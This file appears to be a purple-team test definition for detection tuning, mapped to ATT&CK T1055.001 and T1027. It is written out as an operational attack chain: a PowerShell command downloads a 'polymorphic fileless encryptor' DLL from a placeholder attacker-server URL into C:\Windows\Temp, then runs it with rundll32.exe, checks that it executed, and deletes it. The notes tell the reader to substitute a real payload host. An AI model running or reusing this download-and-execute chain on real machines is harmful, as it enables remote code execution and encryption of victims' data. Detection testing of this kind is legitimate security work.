@@ -1,1 +1,80 @@
+id: nsfw-fileless-encryptor
+name: NSFW Fileless Encryptor Deployment
+description: >
+  Purple team automation to deploy and execute NSFW polymorphic fileless encryptor DLL
+  on Windows systems using rundll32.exe. Simulates Process Injection (T1055.001)
+  and Obfuscated Files or Information (T1027) techniques for detection testing.
+author: Contractor
+date: 2025-05-20
+platform: windows
+attack_techniques:
+  - id: T1055.001
+    name: Process Injection - Dynamic-link Library Injection
+  - id: T1027
+    name: Obfuscated Files or Information
+
+atomic_tests:
+  - name: Upload NSFW DLL payload
+    description: >
+      Downloads the NSFW payload DLL to the target system’s temporary directory
+      using PowerShell.
+    supported_platforms:
+      - windows
+    command: |
+      powershell -NoProfile -Command "Invoke-WebRequest -Uri http://attacker-server/nsfw.dll -OutFile C:\Windows\Temp\nsfw.dll"
+    executor: powershell
+    cleanup_command: |
+      powershell -NoProfile -Command "Remove-Item C:\Windows\Temp\nsfw.dll -Force"
+    dependencies:
+      - powershell
+
+  - name: Execute NSFW DLL via rundll32.exe
+    description: >
+      Executes the NSFW DLL payload in memory via rundll32.exe to simulate fileless
+      code execution and encryption activity.
+    supported_platforms:
+      - windows
+    command: |
+      rundll32.exe C:\Windows\Temp\nsfw.dll,PolymorphicEncryptorMain
+    executor: command_prompt
+    detection:
+      - type: process_creation
+        pattern: rundll32.exe
+        detail: Launching rundll32.exe with suspicious DLL path C:\Windows\Temp\nsfw.dll
+
+  - name: Validate NSFW payload execution
+    description: >
+      Checks for the presence of rundll32.exe processes linked to nsfw.dll to confirm
+      payload execution.
+    supported_platforms:
+      - windows
+    command: |
+      powershell -NoProfile -Command "Get-Process rundll32 | Where-Object { $_.Path -like '*nsfw.dll*' }"
+    executor: powershell
+
+  - name: Cleanup NSFW DLL payload
+    description: >
+      Deletes the NSFW DLL payload from disk to maintain fileless footprint.
+    supported_platforms:
+      - windows
+    command: |
+      powershell -NoProfile -Command "Remove-Item C:\Windows\Temp\nsfw.dll -Force"
+    executor: powershell
+
+attack_map:
+  tactic: execution
+  technique: T1055.001
+  subtechnique: T1055.001
+
+workflow:
+  - step: Upload NSFW DLL payload
+  - step: Execute NSFW DLL via rundll32.exe
+  - step: Validate NSFW payload execution
+  - step: Cleanup NSFW DLL payload
+
+notes:
+  - Replace "http://attacker-server/nsfw.dll" with your actual payload hosting URL.
+  - Ensure PowerShell and rundll32.exe execution policies permit these actions.
+  - Collect Sysmon or EDR logs for monitoring process creation and network events.
+  - This workflow simulates a fileless encryptor attack for purple team detection tuning.
 
